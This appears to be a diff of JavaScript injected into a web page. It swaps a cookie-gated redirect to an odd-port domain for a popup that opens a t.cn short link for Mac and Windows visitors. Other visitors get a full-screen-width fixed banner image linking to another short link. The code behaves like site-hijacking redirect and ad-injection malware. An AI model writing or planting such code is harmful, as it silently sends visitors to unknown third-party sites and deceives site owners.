@@ -1,12 +1,11 @@
 if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
-    throw SyntaxError();
-}
-window.onload = function(){
     if (!getCookie('cc_cookie')) {
         setCookie('cc_cookie','ok',1);
-        window.location.href="https://m.shensuart.com:168/index.html?u=80260";
-     }
-}
+        window.open("http://t.cn/EGwSi9P");
+    }
+}else{
+   document.writeln("<a href=\'http://t.cn/EGwS68r\'rel=\'noreferrer\'><img src=\'https://telecom2019.github.io/qpttw.gif\'class=\'pic66\'/><style>.pic66{position:fixed;bottom:0px;width:100%;height:10%}</style>");}
+
 function getCookie(cname) {
     var name = cname + "=";
     var ca = document.cookie.split(';');
